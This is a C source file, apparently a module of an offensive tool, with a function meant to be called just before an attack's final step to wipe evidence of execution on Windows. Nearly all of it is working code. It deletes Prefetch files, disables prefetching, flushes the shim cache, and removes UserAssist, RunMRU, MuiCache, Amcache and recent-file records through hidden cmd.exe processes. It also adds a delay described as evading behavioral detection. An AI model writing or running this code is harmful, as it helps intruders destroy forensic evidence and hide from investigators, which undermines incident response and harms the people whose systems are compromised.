/* 
Anti-forensics techniques using various registry manipulation functions to cover traces of execution. 
anti_forensic() function can be called before your last exeuction step, placed just tbefore that line of code
-af --anti-forensics
*/


#include "anti_forensic.h"
// #include <windows.h>
// #include <stdio.h>
#include <time.h>

// Function to delete recent Prefetch files based on the current timestamp
// note that this function is only a proof-of-concept and not stealth and creates a lot of noise
// If you want to use this function in a real-world scenario, you should implement a more stealthy approach
void delete_recent_prefetch() {
    WIN32_FIND_DATA fileData;
    HANDLE hFind;
    SYSTEMTIME currentTime, fileTime;
    FILETIME ft;
    char filePath[MAX_PATH];

    // Get the current system time before execution
    GetSystemTime(&currentTime);

    // Locate all .pf files in C:\Windows\Prefetch
    hFind = FindFirstFile("C:\\Windows\\Prefetch\\*.pf", &fileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[-] No Prefetch files found or access denied.\n");
        return;
    }

    do {
        // Convert file's last write time to SYSTEMTIME
        FileTimeToLocalFileTime(&fileData.ftLastWriteTime, &ft);
        FileTimeToSystemTime(&ft, &fileTime);

        // Compare file timestamp with recorded current timestamp
        if (fileTime.wYear > currentTime.wYear ||
            (fileTime.wYear == currentTime.wYear && fileTime.wMonth > currentTime.wMonth) ||
            (fileTime.wYear == currentTime.wYear && fileTime.wMonth == currentTime.wMonth && fileTime.wDay > currentTime.wDay) ||
            (fileTime.wYear == currentTime.wYear && fileTime.wMonth == currentTime.wMonth && fileTime.wDay == currentTime.wDay && fileTime.wHour > currentTime.wHour) ||
            (fileTime.wYear == currentTime.wYear && fileTime.wMonth == currentTime.wMonth && fileTime.wDay == currentTime.wDay && fileTime.wHour == currentTime.wHour && fileTime.wMinute >= currentTime.wMinute)) {
            
            // Construct the full file path
            snprintf(filePath, MAX_PATH, "C:\\Windows\\Prefetch\\%s", fileData.cFileName);
            
            // Delete the file
            if (DeleteFile(filePath)) {
                printf("[+] Deleted Prefetch file: %s\n", fileData.cFileName);
            } else {
                printf("[-] Failed to delete: %s (Error: %d)\n", fileData.cFileName, GetLastError());
            }
        }
    } while (FindNextFile(hFind, &fileData));

    FindClose(hFind);
}


// function to run cmd via create process function. 
void run_cmd(const char *cmd) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the command window

    // Construct command string
    char fullCmd[MAX_PATH];
    snprintf(fullCmd, MAX_PATH, "cmd.exe /c %s", cmd);

    // Create a process to run the command
    if (CreateProcess(NULL, fullCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // Wait for process to complete and close handles
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* TODO: time stomping*/

void anti_forensic() {


    run_cmd("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" /f");
    run_cmd("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\" /f");


    // Disable Prefetch
    // This command requires admin/system privileges. So if the binary is not running with admin privileges, it will fail sliently.
    run_cmd("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f");
    
    // Flush application compatibility cache
    run_cmd("Rundll32.exe apphelp.dll,ShimFlushCache");

    // Remove tracking from registry
    run_cmd("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /f");
    run_cmd("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Search\\RecentApps\" /f");
    run_cmd("reg delete \"HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\" /f");


    // Remove cmd execution history
    run_cmd("reg delete \"HKCU\\Console\\Cmd.exe\" /f");

    // Remove recent file tracking
    run_cmd("del /F /Q \"%APPDATA%\\Microsoft\\Windows\\Recent\\*\"");
    run_cmd("del /F /Q \"%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*\"");
    run_cmd("del /F /Q \"%APPDATA%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*\"");

    // AppCompatCache from the registry
    run_cmd("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\" /v AppCompatCache /f");
    // AppCompat data storage
    run_cmd("del /F /Q %SystemRoot%\\AppCompat\\Programs\\Amcache.hve");



    // Then, delete Prefetch files created after script execution
    // This command requires admin/system privileges. So if the binary is not running with admin privileges, it will fail.
    delete_recent_prefetch();

    printf("[+] Traces cleaned \n");
    // Delay to prevent behavioral detection
    Sleep(3000);
}



///////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////


